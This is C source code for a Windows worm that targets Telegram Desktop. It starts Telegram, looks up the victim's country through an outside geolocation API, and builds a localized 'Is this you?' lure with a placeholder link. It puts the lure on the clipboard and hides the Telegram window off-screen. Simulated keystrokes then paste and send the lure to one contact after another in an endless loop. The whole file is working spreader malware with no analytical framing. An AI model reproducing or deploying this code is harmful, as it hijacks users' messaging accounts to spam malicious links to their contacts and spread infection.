#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <Shlwapi.h>
#include <wininet.h>

bool IsProcessRunning(char *szProcName)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (!Process32First(snapshot, &entry))
    {
        CloseHandle(snapshot);

        return false;
    }

    do
    {
        if (strcmp(entry.szExeFile, szProcName) == 0)
        {
            CloseHandle(snapshot);
  
            return true;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);

    return false;
}

DWORD WINAPI KillThread(LPVOID param)
{
    Sleep(10000);

    ExitProcess(0);
}

bool SetClipboardTextW(wchar_t *wszText)
{
    bool SetOk = false;

    if (OpenClipboard(NULL))
    {
        if (EmptyClipboard())
        {
            int size = sizeof(wszText);
  
            size += sizeof(WCHAR) * (wcslen(wszText) +1);

            HGLOBAL hClipboardData = GlobalAlloc(NULL, size);
  
            if (hClipboardData)
            {
                WCHAR* pchData = (WCHAR*) GlobalLock(hClipboardData);
  
                if (pchData)
                {
                    memcpy(pchData, (WCHAR*)wszText, size);
          
                    GlobalUnlock(hClipboardData);

                    SetClipboardData(CF_UNICODETEXT, hClipboardData);

                    SetOk = true;
                }
            }
        }

        CloseClipboard();
    }

    return SetOk;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    Sleep(1000);

    char cfg_mutex[]  = "735733";

    HANDLE mutex;
    mutex = CreateMutex(NULL, FALSE, cfg_mutex);
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        ExitProcess(0);

    WCHAR wszAppData[MAX_PATH];
    WCHAR wszTelegramPath[MAX_PATH];

    ExpandEnvironmentStringsW(L"%appdata%", wszAppData, sizeof(wszAppData));

    wsprintfW(wszTelegramPath, L"%ls\\Telegram Desktop\\Telegram.exe", wszAppData);
          
    if (PathFileExistsW(wszTelegramPath))
    {
        if (IsProcessRunning("Telegram.exe") == false)
        {
            ShellExecuteW(NULL, L"open", wszTelegramPath, NULL, NULL, SW_SHOW);

            Sleep(30000);
        }

        if (IsProcessRunning("Telegram.exe") == true)
        {
            HINTERNET hOpen, hURL;

            DWORD dwRead;

            char *geo;
            char szData[MAX_PATH];
            WCHAR wszGEOMsg[50];
            WCHAR wszSpreadMsg[500];
  
            bool GetGEOOk = false;
      
            hOpen = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

            if (hOpen != NULL)
            {
                hURL = InternetOpenUrl(hOpen, "http://api.wipmania.com/", NULL, 0, 0, 0);

                if (hURL != NULL)
                {
                    memset(szData,0,sizeof(szData));

                    InternetReadFile(hURL, szData, sizeof(szData) - 1, &dwRead) && dwRead != 0;
      
                    geo = strchr(szData, '>');
          
                    if (geo)
                    {
                        geo++;
              
                        GetGEOOk = true;
              
                        if (strcmp(geo, "RU") == 0) wsprintfW(wszGEOMsg, L"Лучшее фото )");
                        else if (strcmp(geo, "UZ") == 0) wsprintfW(wszGEOMsg, L"Eng yaxshi rasm");
                        else if (strcmp(geo, "HU") == 0) wsprintfW(wszGEOMsg, L"Te vagy?");
                        else if (strcmp(geo, "ID") == 0) wsprintfW(wszGEOMsg, L"Apakah kamu itu");
                        else if (strcmp(geo, "IT") == 0) wsprintfW(wszGEOMsg, L"Sei tu?");
                        else if (strcmp(geo, "DE") == 0) wsprintfW(wszGEOMsg, L"Bist du das?");
                        else if (strcmp(geo, "FR") == 0) wsprintfW(wszGEOMsg, L"Est-ce toi?");
                        else if (strcmp(geo, "ES") == 0) wsprintfW(wszGEOMsg, L"Este Eres tu");
                        else if (strcmp(geo, "DK") == 0) wsprintfW(wszGEOMsg, L"Er det dig?");
                        else if (strcmp(geo, "TR") == 0) wsprintfW(wszGEOMsg, L"Bu sen misin?");
                        else if (strcmp(geo, "CZ") == 0) wsprintfW(wszGEOMsg, L"Jsi to?");  
                        else if (strcmp(geo, "EE") == 0) wsprintfW(wszGEOMsg, L"Kas sa oled see?");  
                        else if (strcmp(geo, "HR") == 0) wsprintfW(wszGEOMsg, L"Jesi li to ti?");
                        else if (strcmp(geo, "SI") == 0) wsprintfW(wszGEOMsg, L"Si to ti?");
                        else if (strcmp(geo, "PH") == 0) wsprintfW(wszGEOMsg, L"Ikaw ba ito?");
                        else if (strcmp(geo, "AD") == 0) wsprintfW(wszGEOMsg, L"Ets tu?");
                        else if (strcmp(geo, "AT") == 0) wsprintfW(wszGEOMsg, L"Bist du das?");
                        else if (strcmp(geo, "MY") == 0) wsprintfW(wszGEOMsg, L"Adakah ini awak?");
                        else if (strcmp(geo, "PL") == 0) wsprintfW(wszGEOMsg, L"Czy to ty?");
                        else if (strcmp(geo, "NO") == 0) wsprintfW(wszGEOMsg, L"Er dette deg?");
                        else if (strcmp(geo, "RO") == 0) wsprintfW(wszGEOMsg, L"Esti tu?");
                        else if (strcmp(geo, "SO") == 0) wsprintfW(wszGEOMsg, L"Ma kanaa?");
                        else if (strcmp(geo, "HI") == 0) wsprintfW(wszGEOMsg, L"Pela anei oukou?");
                        else if (strcmp(geo, "TM") == 0) wsprintfW(wszGEOMsg, L"Bu senmi?");
                        else if (strcmp(geo, "SG") == 0) wsprintfW(wszGEOMsg, L"Adakah ini awak?");
                        else if (strcmp(geo, "NL") == 0) wsprintfW(wszGEOMsg, L"Ben jij dit?");
                        else if (strcmp(geo, "BE") == 0) wsprintfW(wszGEOMsg, L"Ben jij dit?");
                        else if (strcmp(geo, "CN") == 0) wsprintfW(wszGEOMsg, L"這是你嗎？");
                        else if (strcmp(geo, "JP") == 0) wsprintfW(wszGEOMsg, L"あなたですが？");
                        else if (strcmp(geo, "KR") == 0) wsprintfW(wszGEOMsg, L"이게 당신인가요?");
                        else if (strcmp(geo, "TH") == 0) wsprintfW(wszGEOMsg, L"นี่คุณหรือเปล่า");
                        else if (strcmp(geo, "VN") == 0) wsprintfW(wszGEOMsg, L"Đây có phải là bạn?");
                        else if (strcmp(geo, "GR") == 0) wsprintfW(wszGEOMsg, L"Είσαι εσύ?");
                        else if (strcmp(geo, "FI") == 0) wsprintfW(wszGEOMsg, L"Oletko sinä tässä?");
                        else if (strcmp(geo, "UA") == 0) wsprintfW(wszGEOMsg, L"Це ти?");
                        else if (strcmp(geo, "KZ") == 0) wsprintfW(wszGEOMsg, L"Бұл сіз бе?");
                        else if (strcmp(geo, "RO") == 0) wsprintfW(wszGEOMsg, L"Ești asta???");
                        else if (strcmp(geo, "SK") == 0) wsprintfW(wszGEOMsg, L"Você é isso?");
                        else if (strcmp(geo, "AZ") == 0) wsprintfW(wszGEOMsg, L"Sənsən?");
                        else if (strcmp(geo, "AR") == 0) wsprintfW(wszGEOMsg, L"Դու այդպիսին ես");
                        else if (strcmp(geo, "BY") == 0) wsprintfW(wszGEOMsg, L"Гэта вы?");
                        else if (strcmp(geo, "GE") == 0) wsprintfW(wszGEOMsg, L"შენ ის ხარ?");
                        else if (strcmp(geo, "IL") == 0) wsprintfW(wszGEOMsg, L"שוויץ");
                        else if (strcmp(geo, "AL") == 0) wsprintfW(wszGEOMsg, L"A je ti");
                        else if (strcmp(geo, "BG") == 0) wsprintfW(wszGEOMsg, L"Това ти ли си?");
                        else if (strcmp(geo, "IN") == 0) wsprintfW(wszGEOMsg, L"क्या यह आप हो?");
                        else if (strcmp(geo, "PK") == 0) wsprintfW(wszGEOMsg, L"کیا یہ آپ ہیں؟");
                        else if (strcmp(geo, "AF") == 0) wsprintfW(wszGEOMsg, L"دا ته یې؟");
                        else if (strcmp(geo, "EG") == 0) wsprintfW(wszGEOMsg, L"هل هذا انت؟");
                        else if (strcmp(geo, "AM") == 0) wsprintfW(wszGEOMsg, L"Դու սա ես");
                        else if (strcmp(geo, "AO") == 0) wsprintfW(wszGEOMsg, L"É você?");
                        else if (strcmp(geo, "IQ") == 0) wsprintfW(wszGEOMsg, L"Ev tu yî?");
                        else if (strcmp(geo, "IR") == 0) wsprintfW(wszGEOMsg, L"این شمایید؟");
                        else if (strcmp(geo, "SR") == 0) wsprintfW(wszGEOMsg, L"Јеси ли то ти?");
                        else if (strcmp(geo, "LU") == 0) wsprintfW(wszGEOMsg, L"Ass dëst Dir?");
                        else if (strcmp(geo, "JO") == 0) wsprintfW(wszGEOMsg,L"هل هذا انت؟");
                        else if (strcmp(geo, "BD") == 0) wsprintfW(wszGEOMsg,L"এটা তুমি?");
                        else if (strcmp(geo, "KG") == 0) wsprintfW(wszGEOMsg, L"Бул сизби?");
                        else if (strcmp(geo, "MK") == 0) wsprintfW(wszGEOMsg, L"Дали си ова?");
                        else if (strcmp(geo, "LT") == 0) wsprintfW(wszGEOMsg, L"Ar tai jūs?");
                        else if (strcmp(geo, "LV") == 0) wsprintfW(wszGEOMsg, L"Vai tas esi tu?");
                        else wsprintfW(wszGEOMsg, L"Best photo");
                    }
                }
                  
                InternetCloseHandle(hURL);
            }
              
            InternetCloseHandle(hOpen);
  
            Sleep(1000);
  
            if (GetGEOOk == true)
            {
                wsprintfW(wszSpreadMsg, L"%ls http://link.com/photo.php", wszGEOMsg);

                if (SetClipboardTextW(wszSpreadMsg) == true)
                {
                    Sleep(100);
          
                        HWND hMainWindow = FindWindow("Qt5QWindowIcon", NULL);

                        if (hMainWindow)
                        {
                            CreateThread(NULL, 0, KillThread, 0, 0, 0);

                            ShowWindow(hMainWindow, 1);

                            SetWindowPos(hMainWindow, HWND_TOPMOST, -2900, -2900, 0, 0, SWP_NOSIZE);
                  
                            SetForegroundWindow(hMainWindow);

                            SetFocus(hMainWindow);
                  
                            Sleep(200);

                            keybd_event(VK_CONTROL, 0,  0, 0);
                            keybd_event(VK_MENU, 0, 0, 0);

                            keybd_event(VK_HOME, 0, 0, 0);
                            keybd_event(VK_HOME, 0, KEYEVENTF_KEYUP, 0);

                            keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP , 0);
                            keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP , 0);

                            Sleep(100);

                            int i = 0;

                    startit:

                            Sleep(200);
                  
                            keybd_event(VK_CONTROL, 0,  0, 0);
                                              
                            for (int contacts = 0; contacts < i; contacts++)
                            {
                                SendMessage(hMainWindow, WM_KEYDOWN, VK_TAB, 0);
                                SendMessage(hMainWindow, WM_KEYUP, VK_TAB, 0);
                  
                                Sleep(50);
                            }
                          
                            keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP , 0);
                                              
                            Sleep(100);

                            i++;
                                      
                            SetForegroundWindow(hMainWindow);
                  
                            SetFocus(hMainWindow);
                  
                            Sleep(200);
                  
                            INPUT ip;
                            ip.type = INPUT_KEYBOARD;
                            ip.ki.wScan = 0;
                            ip.ki.time = 0;
                            ip.ki.dwExtraInfo = 0;
                  
                            ip.ki.wVk = VK_CONTROL;
                            ip.ki.dwFlags = 0; // 0 for key press
                            SendInput(1, &ip, sizeof(INPUT));

                            ip.ki.wVk = 'V';
                            ip.ki.dwFlags = 0; // 0 for key press
                            SendInput(1, &ip, sizeof(INPUT));
               
                            ip.ki.wVk = 'V';
                            ip.ki.dwFlags = KEYEVENTF_KEYUP;
                            SendInput(1, &ip, sizeof(INPUT));
                  
                            ip.ki.wVk = VK_CONTROL;
                            ip.ki.dwFlags = KEYEVENTF_KEYUP;
                            SendInput(1, &ip, sizeof(INPUT));
      
                            Sleep(100);

                            for (int i = 0; i < 3; i++)
                            {
                                Sleep(100);

                                keybd_event(VK_RETURN ,0, 0, 0);
                                keybd_event(VK_RETURN ,0, KEYEVENTF_KEYUP , 0);
                            }

                            goto startit;
                        }
                }
            }
        }
    }

    return 0;
}
